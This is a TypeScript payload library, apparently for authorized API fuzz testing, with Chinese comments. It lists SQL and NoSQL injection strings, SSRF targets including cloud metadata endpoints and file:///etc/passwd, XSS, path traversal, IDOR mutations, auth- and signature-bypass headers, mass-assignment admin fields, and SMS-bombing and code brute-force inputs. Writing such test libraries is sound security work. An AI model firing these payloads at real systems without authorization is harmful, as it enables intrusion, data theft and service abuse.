/**
 * Fuzz 测试载荷库
 * 对应 PDF 第 6 章：单接口垂直测试五维度
 */

export interface Payload {
  name: string;
  value: string;
  description: string;
}

export interface MassAssignmentPayload {
  name: string;
  field: string;
  value: any;
  description: string;
}

export interface BusinessLogicPayload {
  name: string;
  field: string;
  value: any;
  description: string;
}

/** 越权测试载荷 */
export const AUTH_BYPASS_HEADERS: Record<string, string>[] = [
  {}, // 无 Token
  { 'Authorization': 'Bearer invalid' },
  { 'Authorization': 'Bearer null' },
  { 'Authorization': 'Bearer undefined' },
  { 'Cookie': '' },
  { 'X-Forwarded-For': '127.0.0.1' },
  { 'X-Real-IP': '127.0.0.1' },
  { 'X-Originating-IP': '127.0.0.1' },
  { 'X-Remote-IP': '127.0.0.1' },
];

/** IDOR 测试：替换 URL 路径中的数字 ID */
export const IDOR_ID_REPLACEMENTS = [
  { pattern: /\/(\d+)/g, name: 'increment', replacer: (m: string, id: string) => m.replace(id, String(Number(id) + 1)) },
  { pattern: /\/(\d+)/g, name: 'decrement', replacer: (m: string, id: string) => m.replace(id, String(Math.max(1, Number(id) - 1))) },
  { pattern: /\/(\d+)/g, name: 'zero', replacer: (m: string) => m.replace(/\d+/, '0') },
];

/** Body / Query 中的 IDOR 替换值 */
export const IDOR_BODY_VALUES = ['0', '1', '2', '-1', '999999'];

/** SQL 注入载荷 */
export const SQL_INJECTION_PAYLOADS: Payload[] = [
  { name: 'basic_quote', value: "'", description: '单引号测试' },
  { name: 'basic_dquote', value: '"', description: '双引号测试' },
  { name: 'or_1=1', value: "' OR '1'='1", description: 'OR 注入' },
  { name: 'or_1=1_comment', value: "' OR 1=1--", description: 'OR 注入 + 注释' },
  { name: 'admin_bypass', value: "admin'--", description: '管理员绕过' },
  { name: 'union_select', value: "' UNION SELECT NULL--", description: 'UNION 注入' },
  { name: 'sleep', value: "' AND SLEEP(2)--", description: '时间盲注' },
  { name: 'benchmark', value: "' AND BENCHMARK(1000000,MD5('a'))--", description: 'MySQL 时间盲注' },
];

/** NoSQL 注入载荷（MongoDB 等） */
export const NOSQL_INJECTION_PAYLOADS: Payload[] = [
  { name: 'ne_empty', value: '{"$ne":null}', description: '$ne 不等于' },
  { name: 'ne_number', value: '{"$ne":123}', description: '$ne 数字' },
  { name: 'gt_empty', value: '{"$gt":""}', description: '$gt 大于空字符串' },
  { name: 'exists_true', value: '{"$exists":true}', description: '$exists 存在' },
  { name: 'regex_all', value: '{"$regex":".*"}', description: '$regex 匹配全部' },
  { name: 'where_true', value: '{"$where":"this"}', description: '$where 执行' }
];

/** SSRF 载荷 */
export const SSRF_PAYLOADS: Payload[] = [
  { name: 'localhost', value: 'http://127.0.0.1', description: '本地回环' },
  { name: 'localhost_alt', value: 'http://localhost', description: 'localhost' },
  { name: 'internal_metadata', value: 'http://169.254.169.254/latest/meta-data/', description: 'AWS 元数据' },
  { name: 'internal_gcp', value: 'http://metadata.google.internal/computeMetadata/v1/', description: 'GCP 元数据' },
  { name: 'file_protocol', value: 'file:///etc/passwd', description: '文件协议' },
];

/** 参数注入载荷 */
export const PARAM_INJECTION_PAYLOADS: Payload[] = [
  { name: 'xss_basic', value: '<script>alert(1)</script>', description: 'XSS 基础' },
  { name: 'xss_img', value: '<img src=x onerror=alert(1)>', description: 'XSS img' },
  { name: 'nosql_inject', value: '{"$gt":""}', description: 'NoSQL 注入' },
  { name: 'prototype_pollution', value: '__proto__[admin]=true', description: '原型污染' },
  { name: 'overly_long', value: 'A'.repeat(5000), description: '超长字符串' },
  { name: 'negative_number', value: '-1', description: '负数测试' },
  { name: 'zero', value: '0', description: '零值测试' },
  { name: 'special_chars', value: '../../../etc/passwd', description: '路径遍历' },
];

/** Mass Assignment 载荷：后端 ORM 自动绑定可能照单全收 */
export const MASS_ASSIGNMENT_PAYLOADS: MassAssignmentPayload[] = [
  { name: 'role_admin', field: 'role', value: 'admin', description: '添加 role=admin' },
  { name: 'isAdmin_true', field: 'isAdmin', value: true, description: '添加 isAdmin=true' },
  { name: 'is_admin', field: 'is_admin', value: true, description: '添加 is_admin=true' },
  { name: 'userType_9', field: 'userType', value: 9, description: '添加 userType=9' },
  { name: 'type_admin', field: 'type', value: 'admin', description: '添加 type=admin' },
  { name: 'status_active', field: 'status', value: 'active', description: '添加 status=active' },
];

/** 业务逻辑测试载荷 */
export const BUSINESS_LOGIC_PAYLOADS: BusinessLogicPayload[] = [
  { name: 'price_zero', field: 'price', value: 0, description: 'price=0' },
  { name: 'price_negative', field: 'price', value: -1, description: 'price=-1' },
  { name: 'amount_huge', field: 'amount', value: 99999999, description: 'amount=99999999' },
  { name: 'quantity_zero', field: 'quantity', value: 0, description: 'quantity=0' },
  { name: 'quantity_negative', field: 'quantity', value: -1, description: 'quantity=-1' },
  { name: 'type_array', field: 'id', value: [], description: '类型混淆 id=[]' },
];

/** 接口滥用测试载荷 */
export const INTERFACE_ABUSE_PAYLOADS: Payload[] = [
  { name: 'sms_phone', value: '13800138000', description: '短信轰炸: phone' },
  { name: 'sms_email', value: 'test@example.com', description: '邮件轰炸: email' },
  { name: 'verify_code_0000', value: '0000', description: '验证码爆破: 0000' },
  { name: 'verify_code_1234', value: '1234', description: '验证码爆破: 1234' },
  { name: 'coupon_code', value: 'WELCOME', description: '优惠券重复领取' },
  { name: 'draw_rapid', value: '1', description: '抽奖/领券高频请求' }
];

/** 签名绕过测试：删除常见签名字段/头 */
export const SIGN_BYPASS_HEADERS: Record<string, string>[] = [
  { 'X-Sign': '' },
  { 'X-Signature': '' },
  { 'Sign': '' },
  { 'Signature': '' },
  { 'X-Timestamp': '' },
  { 'X-Nonce': '' },
  { 'X-Request-Sign': '' }
];

/** 签名绕过测试：删除常见签名查询参数 */
export const SIGN_BYPASS_PARAMS = ['sign', 'signature', 'sig', '_sign', 'timestamp', 'nonce', '_timestamp', '_nonce'];

/** 子域名列举载荷 */
export const SUBDOMAIN_PREFIXES = [
  'test', 'dev', 'staging', 'admin', 'api', 'legacy',
  'old', 'new', 'beta', 'alpha', 'uat', 'qa',
  'internal', 'sandbox', 'demo', 'preprod', 'stage'
];

/** 横向 Fuzz 路径变异：不同域名可能用不同路径前缀 */
export function generatePathVariants(path: string): string[] {
  const variants = new Set<string>([path]);

  // 老系统可能没有 api 前缀
  variants.add(path.replace(/^\/api\/v\d+\//, '/'));
  variants.add(path.replace(/^\/api\/v\d+\//, '/v1/'));

  // 去掉 api 前缀但保留版本
  variants.add(path.replace(/^\/api\//, '/'));

  // admin 域可能加 admin 前缀
  variants.add('/admin' + path);
  variants.add('/admin/api' + path.replace(/^\/api/, ''));

  // 可能只有版本号没有 api
  const noApi = path.replace(/^\/api\//, '/');
  if (noApi !== path) { variants.add(noApi); }

  return Array.from(variants).filter(p => p.startsWith('/'));
}

/** 通用错误/未授权关键字，用于判断响应是否真的没有通过 */
export const UNAUTHORIZED_KEYWORDS = [
  'unauthorized', 'forbidden', 'invalid token', 'token expired',
  '鉴权失败', '未登录', '登录失效', '无权限', 'access denied',
  'auth failed', 'not logged in', 'please login', 'sign in'
];
